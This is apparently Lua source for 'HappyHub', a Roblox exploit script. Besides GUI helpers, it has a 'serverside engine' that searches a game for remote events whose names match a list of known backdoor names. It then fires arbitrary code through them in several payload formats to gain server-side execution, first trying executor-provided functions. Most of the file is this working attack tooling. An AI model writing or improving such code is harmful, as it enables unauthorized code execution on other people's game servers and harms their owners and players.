local function mk(cls, props, par)
    local i = Instance.new(cls)
    for k, v in pairs(props or {}) do pcall(function() i[k] = v end) end
    if par then i.Parent = par end
    return i
end
local function corner(i, r)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 5); c.Parent = i; return c
end
local function grad(i, c1, c2, c3)
    c1 = c1 or Color3.fromRGB(255, 80, 80)
    c2 = c2 or Color3.fromRGB(160, 80, 255)
    c3 = c3 or Color3.fromRGB(80, 180, 255)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, c1),
        ColorSequenceKeypoint.new(0.5, c2),
        ColorSequenceKeypoint.new(1, c3),
    }
    g.Parent = i; return g
end
local function notif(t, d)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "HappyHub", Text = tostring(t), Duration = d or 3,
        })
    end)
end
local function playClick()
    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://1673280232"; s.Volume = 1; s.Parent = ScreenGui
        s:Play(); game:GetService("Debris"):AddItem(s, 2)
    end)
end

--==================================================================
-- SERVERSIDE ENGINE
--==================================================================
local SS = { enabled = false, activeBackdoor = nil, lastScan = 0 }
local BACKDOOR_NAMES = {
    "remote","mainevent","backdoor","backd00r","ss","serverside",
    "serverevent","serverscript","kohl","c00lkidd","c00lkid","lalol",
    "anti","ping","checkping","dataevent","mainremote","command","cmds",
    "adminremote","execute","exec","loader","loadstring","run","fire",
}
local PAYLOAD_SHAPES = {
    function(c) return {"loadstring", c} end,
    function(c) return {"require", c} end,
    function(c) return {"exec", c} end,
    function(c) return {"execute", c} end,
    function(c) return {"run", c} end,
    function(c) return {c} end,
}
local function tryExecutorSS(code)
    local genv = rawget(_G, "getgenv")
    local env = type(genv) == "function" and genv() or _G
    for _, n in ipairs({"ssExecute","SSExecute","ServerExecute","ss_exec","execSS"}) do
        if type(env[n]) == "function" then
            local ok = pcall(env[n], code); if ok then return true, n end
        end
    end
    return false
end
local function findBackdoor()
    if SS.activeBackdoor and SS.activeBackdoor.Parent then return SS.activeBackdoor end
    SS.activeBackdoor = nil
    for _, o in ipairs(game:GetDescendants()) do
        if o:IsA("RemoteEvent") or o:IsA("RemoteFunction") then
            local l = string.lower(o.Name)
            for _, n in ipairs(BACKDOOR_NAMES) do
                if l == n or string.find(l, n, 1, true) then
                    SS.activeBackdoor = o; return o
                end
            end
        end
    end
end
local function ssExecute(code)
    if not SS.enabled then return false, "SS off" end
    local ok, name = tryExecutorSS(code)
    if ok then return true, "executor ("..tostring(name)..")" end
    local rem = findBackdoor()
    if not rem then return false, "no backdoor" end
    for i, sh in ipairs(PAYLOAD_SHAPES) do
        local args = sh(code)
        local fired
        if rem:IsA("RemoteEvent") then
            fired = pcall(function() rem:FireServer(unpack(args)) end)
        else
            fired = pcall(function() rem:InvokeServer(unpack(args)) end)
        end
        if fired then return true, rem:GetFullName().." (#"..i..")" end
    end
    return false, "payload rejected"
end
local function runAction(clientFn, serverCode)
    pcall(clientFn)
    if SS.enabled and serverCode then
        task.spawn(function()
            local ok, err = ssExecute(serverCode)
            if ok then notif("✓ SS: "..tostring(err), 2) end
        end)
    end
end

